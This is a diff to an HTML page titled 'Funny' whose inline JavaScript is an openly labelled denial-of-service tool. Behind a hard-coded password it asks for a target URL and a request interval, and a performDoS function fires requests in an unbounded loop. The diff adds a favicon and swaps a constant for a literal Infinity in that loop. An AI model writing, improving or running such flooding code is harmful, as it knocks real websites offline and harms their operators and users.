@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Funny</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
 </head>
 <body>
 <script>
@@ -15,7 +16,6 @@ if (passw !== 'testing') {
     console.log(passw);
 
     const url = prompt('Full website URL'); // Replace with your website URL
-    const numRequests = Infinity;
     const interval = prompt('interval in milliseconds, 1 is good'); // Reduced interval
     const timeout = 5000; // Increased timeout to 5 seconds
 
@@ -59,7 +59,7 @@ if (passw !== 'testing') {
     // Function to perform DoS attack
     async function performDoS() {
         const requests = [];
-        for (let i = 0; i < numRequests; i++) {
+        for (let i = 0; i < Infinity; i++) {
             requests.push(createRequest());
         }
         try {
@@ -76,3 +76,4 @@ if (passw !== 'testing') {
 </script> <!-- Empty script tag -->
 </body>
 </html>
+
